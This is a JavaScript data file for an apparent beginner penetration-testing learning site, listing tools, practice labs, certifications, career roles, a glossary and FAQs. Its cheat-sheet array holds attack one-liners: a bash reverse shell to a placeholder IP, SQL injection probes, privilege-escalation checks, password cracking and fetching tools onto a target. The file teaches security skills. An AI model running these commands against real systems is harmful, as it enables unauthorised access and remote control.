/* OmniSec extras: tools, labs, cheatsheets, glossary, career, faq */
const TOOLS = [
 {n:"Nmap", c:"Recon", d:"The network scanner. Map hosts, ports and services first.", u:"https://nmap.org/"},
 {n:"Burp Suite", c:"Web", d:"Intercept, inspect and attack HTTP traffic.", u:"https://portswigger.net/burp"},
 {n:"Wireshark", c:"Recon", d:"Read packets like a book.", u:"https://www.wireshark.org/"},
 {n:"Metasploit", c:"Exploitation", d:"Modular exploitation framework.", u:"https://www.metasploit.com/"},
 {n:"ffuf", c:"Web", d:"Blazing fast web fuzzer.", u:"https://github.com/ffuf/ffuf"},
 {n:"Nuclei", c:"Recon", d:"Template-based vulnerability scanner.", u:"https://github.com/projectdiscovery/nuclei"},
 {n:"Hashcat", c:"Exploitation", d:"The fastest password cracker. GPU-powered.", u:"https://hashcat.net/"},
 {n:"SQLMap", c:"Web", d:"Automatic SQL injection exploitation.", u:"https://sqlmap.org/"},
 {n:"Gobuster", c:"Web", d:"Directory and DNS brute-forcer in Go.", u:"https://github.com/OJ/gobuster"},
 {n:"Amass", c:"Recon", d:"Deep subdomain enumeration.", u:"https://github.com/owasp-amass/amass"},
 {n:"BloodHound", c:"Post-Exploit", d:"Map Active Directory attack paths.", u:"https://github.com/SpecterOps/BloodHound"},
 {n:"LinPEAS and WinPEAS", c:"Post-Exploit", d:"Privesc enumeration scripts.", u:"https://github.com/peass-ng/PEASS-ng"},
 {n:"Chisel", c:"Post-Exploit", d:"Fast tunnels over HTTP for pivoting.", u:"https://github.com/jpillora/chisel"},
 {n:"CyberChef", c:"Utilities", d:"Decode, decrypt and analyze anything.", u:"https://gchq.github.io/CyberChef/"},
 {n:"Ghidra", c:"Reversing", d:"Free reverse-engineering suite.", u:"https://ghidra-sre.org/"},
 {n:"Frida", c:"Mobile", d:"Dynamic instrumentation for mobile apps.", u:"https://frida.re/"},
 {n:"Trivy", c:"DevSecOps", d:"Scanner for containers and IaC.", u:"https://github.com/aquasecurity/trivy"},
 {n:"ZAP", c:"Web", d:"Free web scanner by OWASP.", u:"https://www.zaproxy.org/"}
];
const LABS = [
 {n:"PortSwigger Web Security Academy", d:"Free labs for every web vulnerability.", price:"Free", best:"Web hacking", u:"https://portswigger.net/web-security"},
 {n:"TryHackMe", d:"Guided rooms from zero to hero.", price:"Free + Paid", best:"Beginners", u:"https://tryhackme.com/"},
 {n:"HackTheBox", d:"Realistic machines and challenges.", price:"Free + Paid", best:"All-round skill", u:"https://www.hackthebox.com/"},
 {n:"OWASP Juice Shop", d:"Vulnerable web shop. Run locally.", price:"Free", best:"Web practice", u:"https://owasp.org/www-project-juice-shop/"},
 {n:"VulnHub", d:"Downloadable vulnerable VMs.", price:"Free", best:"Offline labs", u:"https://www.vulnhub.com/"},
 {n:"HackTricks", d:"The wiki you will live in.", price:"Free", best:"Reference", u:"https://book.hacktricks.xyz/"},
 {n:"PicoCTF", d:"Beginner-friendly CTF.", price:"Free", best:"CTF starters", u:"https://picoctf.org/"},
 {n:"OverTheWire", d:"Wargames for fundamentals.", price:"Free", best:"Fundamentals", u:"https://overthewire.org/wargames/"}
];
const CHEATS = [
 {t:"Nmap Essentials", d:"Scanning that finds everything.", cmds:["nmap -sC -sV -oN scan.txt TARGET","nmap -p- --min-rate 5000 TARGET"]},
 {t:"Linux PrivEsc Quick Wins", d:"First 60 seconds on a box.", cmds:["sudo -l","find / -perm -4000 2>/dev/null","ss -tlnp"]},
 {t:"Reverse Shells", d:"Call home from anywhere.", cmds:["bash -i >& /dev/tcp/IP/PORT 0>&1"]},
 {t:"TTY Upgrade", d:"Fully interactive shell.", cmds:["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","stty rows 40 cols 160"]},
 {t:"SQLi Probes", d:"Talk to the database.", cmds:["' OR '1'='1","' UNION SELECT NULL-- -"]},
 {t:"Content Discovery", d:"Find hidden content.", cmds:["gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt","ffuf -u URL/FUZZ -w wordlist.txt -mc 200"]},
 {t:"Password Cracking", d:"Hashes into passwords.", cmds:["hashcat -m 0 hashes.txt rockyou.txt","john --wordlist=rockyou.txt hashes.txt"]},
 {t:"File Transfers", d:"Get tools on target.", cmds:["python3 -m http.server 8000","wget http://IP:8000/tool -O /tmp/tool"]}
];
const GLOSSARY = [
 ["Attack Surface","Everything an attacker can touch: ports, apps, APIs, people."],
 ["Brute Force","Trying every possible password until one works."],
 ["CVE","A cataloged public vulnerability with an ID."],
 ["CVSS","A 0-10 score for vulnerability severity."],
 ["Exploit","Code that takes advantage of a vulnerability."],
 ["Fuzzing","Throwing malformed input at software to find bugs."],
 ["IDOR","Accessing other users' data by changing an ID."],
 ["Lateral Movement","Moving between machines inside a network."],
 ["Payload","Malicious code delivered by an exploit."],
 ["Privilege Escalation","Going from low-privilege user to admin or root."],
 ["RCE","Remote Code Execution on someone else's machine."],
 ["Recon","Information gathering before attacking."],
 ["Reverse Shell","The target connects back to you."],
 ["Scope","What you are legally allowed to test."],
 ["SSRF","Tricking a server into making internal requests."],
 ["Zero-Day","An unknown vulnerability with no patch."]
];
const CERTS = [
 {n:"CompTIA Security+", lvl:"Beginner", d:"The classic first cert. Broad fundamentals."},
 {n:"eJPT", lvl:"Beginner+", d:"Practical junior pentest cert, hands-on exam."},
 {n:"PNPT", lvl:"Intermediate", d:"Practical network pentest, includes OSINT and reporting."},
 {n:"OSCP", lvl:"Advanced", d:"The legendary 24-hour exam. Industry benchmark."}
];
const ROLES = [
 {t:"Penetration Tester", d:"Legally break in, then report fixes.", s:"Networking, web hacking, reporting"},
 {t:"Bug Bounty Hunter", d:"Find bugs, get paid per vulnerability.", s:"Web security, creativity"},
 {t:"SOC Analyst", d:"Monitor alerts and hunt threats.", s:"SIEM, incident response"},
 {t:"Red Teamer", d:"Adversary simulation.", s:"OPSEC, AD attacks"},
 {t:"Security Engineer", d:"Build and harden defenses.", s:"Cloud, detection, scripting"},
 {t:"AppSec Engineer", d:"Secure software from the inside.", s:"Development, OWASP"}
];
const FAQS = [
 {q:"Do I need programming to start?", a:"No. Start with networking and Linux, pick up Python and Bash as you go by automating hacker tasks."},
 {q:"How long until job-ready?", a:"9 to 18 months of focused daily study for a junior pentest or SOC role."},
 {q:"Is hacking legal?", a:"Only with permission. Use your own labs, CTFs, and in-scope bounty programs."},
 {q:"Kali or something else?", a:"Kali in a VM with snapshots is the standard start."},
 {q:"Should I get certifications?", a:"Skills first, then one respected practical cert like eJPT, PNPT or Security+."},
 {q:"How do I stay motivated?", a:"Hack a little every day. Streaks beat marathons."}
];
const RES_CARDS = [
 {id:"tools", icon:"◈", t:"Tools Arsenal", d:"Every hacker's toolkit, categorized and explained."},
 {id:"labs", icon:"⬢", t:"Practice Labs", d:"Where to hack legally. The best training grounds."},
 {id:"cheatsheets", icon:"⚡", t:"Cheat Sheets", d:"Copy-paste commands. Your field manual."},
 {id:"glossary", icon:"✦", t:"Glossary", d:"Every term a beginner meets, in plain words."},
 {id:"career", icon:"▲", t:"Certs and Career", d:"Certs that matter and roles you can land."},
 {id:"faq", icon:"❓", t:"FAQ", d:"Every beginner question, answered honestly."}
];
